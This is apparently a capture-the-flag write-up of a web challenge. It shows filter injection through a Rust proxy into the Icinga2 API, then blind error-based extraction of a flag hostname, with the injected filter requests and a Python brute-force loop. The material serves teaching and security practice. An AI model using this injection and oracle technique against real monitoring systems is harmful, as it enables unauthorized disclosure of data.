# Web Medium Challenge: Icinga2 Filter Injection

## Challenge Overview

This challenge involves exploiting an Icinga2 API proxy that filters hosts based on user hostgroups. The goal is to extract a flag that exists as a hostname in the Icinga2 system through filter injection and error-based information disclosure.

## Challenge Setup

The application consists of:
- A Rust-based proxy server that authenticates users and filters Icinga2 API responses
- An Icinga2 monitoring system with hosts containing the flag
- A web interface for querying host information

## Vulnerability Analysis

### 1. Initial Access
After logging in with the provided credentials (`peter:peter_120867`), users can make requests to query hosts through the proxy.

### 2. API Endpoint Discovery
The UI uses the following request to get filtered host lists:
```
http://{host}:{port}/icinga2/v1/objects/hosts?host=<user_input>
```

### 3. Icinga2 Filter Documentation
According to the [Icinga2 API documentation](https://icinga.com/docs/icinga-2/latest/doc/12-icinga2-api/#filters), the API supports advanced filtering using the `filter` parameter instead of just the `host` parameter.

### 4. Filter Injection Vulnerability
The proxy passes query parameters directly to Icinga2 without proper validation, allowing filter injection:
```
http://{host}:{port}/icinga2/v1/objects/hosts?filter=match("WPCTF{*",host.name)
```

However, this returns `{"results":[]}` because the proxy filters out hosts that don't belong to the user's tenant/hostgroup.

### 5. Error-Based Information Disclosure
The key vulnerability is discovered through error handling behavior:

**Valid filter with invalid syntax:**
- Request: `filter=match("WPCTF{*",host.name)&&INVALID_FILTER`
- Response: `404 Not Found` (if the match condition is true)

**Valid filter with no matches:**
- Request: `filter=match("XXX{*",host.name)&&INVALID_FILTER`
- Response: `200 OK` with `{"results":[]}`

This behavior difference allows for blind boolean-based flag extraction.

## Exploitation Steps

### Step 1: Login
```python
login_data = {
    "username": "Peter",
    "password": "peter_120867"
}
response = session.post(f"http://{host}:{port}/login", json=login_data)
```

### Step 2: Confirm Error-Based Behavior
Test the error condition with known flag prefix:
```
GET /icinga2/v1/objects/hosts?filter=match("WPCTF{*",host.name)&&INVALID_FILTER
Response: 404 (confirms flag exists with this prefix)
```

Test with non-matching prefix:
```
GET /icinga2/v1/objects/hosts?filter=match("XXX{*",host.name)&&INVALID_FILTER
Response: 200 (confirms no match)
```

### Step 3: Character-by-Character Extraction
Use the error condition to brute force each character:

```python
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&()_+-=[]{}|;':\",./<>?`~"
flag = "WPCTF{"

for char in charset:
    test_string = flag + char
    filter_query = f'match("{test_string}*",host.name)&&INVALID_FILTER'
    url = f"http://{host}:{port}/icinga2/v1/objects/hosts?filter={filter_query}"
    
    response = session.get(url)
    if response.status_code == 404:
        flag += char
        break
```

### Step 4: Complete Flag Extraction
Continue the process until the closing brace `}` is found:

1. `match("WPCTF{r*",host.name)&&INVALID_FILTER` → 404 (found 'r')
2. `match("WPCTF{re*",host.name)&&INVALID_FILTER` → 404 (found 'e')
3. Continue until complete flag is extracted...

## Solution

The complete exploit script automates this process:

```bash
python3 exploit.py <host> <port>
```

The script will output the flag character by character:
```
[+] Found character: 'r' - Current flag: WPCTF{r
[+] Found character: 'e' - Current flag: WPCTF{re
[+] Found character: 'd' - Current flag: WPCTF{red
...
[+] Final flag: WPCTF{redacted}
```
